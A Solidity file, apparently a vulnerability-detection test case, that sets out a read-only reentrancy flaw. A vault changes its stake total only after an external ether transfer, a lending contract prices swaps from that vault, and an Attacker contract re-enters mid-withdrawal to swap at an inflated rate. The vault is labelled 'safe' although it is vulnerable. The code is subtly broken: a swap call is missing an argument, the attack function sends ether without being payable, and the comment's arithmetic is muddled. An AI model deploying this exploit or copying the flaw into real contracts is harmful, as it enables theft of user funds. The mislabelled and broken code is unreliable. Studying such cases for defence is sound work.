// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ERC20 {
	function balance(address) external view returns (uint256);
	function transferFrom(address from, address to, uint256 amt) external returns (bool);
}


contract ReadOnlyLend_safe1 {
    mapping(address => uint) public balances;
	uint256 public totalStake;

    function withdraw(uint amt) external {
        require(balances[msg.sender] >= amt);
        balances[msg.sender] -= amt;	// this is updated BEFORE the external call
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);
        totalStake -= amt;	// this is updated AFTER the external call
    }

	function deposit() external payable {
		balances[msg.sender] += msg.value;
		totalStake += msg.value;
	}

    function getPrice(address token) public view returns (uint256) {
        return ERC20(token).balance(address(this)) * 1e18 / totalStake;
    }

}

contract ReadOnlyLend_safe1_Lending {
    ReadOnlyLend_safe1 public immutable vault;

    constructor(address v) {
        vault = ReadOnlyLend_safe1(v);
    }

    function swap(address token, uint amt) external {
		ERC20(token).transferFrom(msg.sender, address(this), amt);
        uint256 out = amt / vault.getPrice(token);
		(bool ok,) = msg.sender.call{value: out}("");
		require(ok);
    }
}


contract Attacker {
    ReadOnlyLend_safe1 public vault;
    ReadOnlyLend_safe1_Lending public lending;

    constructor(address v, address l) {
        vault = ReadOnlyLend_safe1(v);
        lending = ReadOnlyLend_safe1_Lending(l);
    }

    function attack() external {
		vault.deposit{value:100 ether}();
        vault.withdraw(50 ether);	// pps = 50 / 100 = 0.5
    }

    receive() external payable {
        lending.swap(100);	// borrows 100 / 0.5 = 200 shares, which is more than the 100 shares deposited, therefore this is profitable
    }
}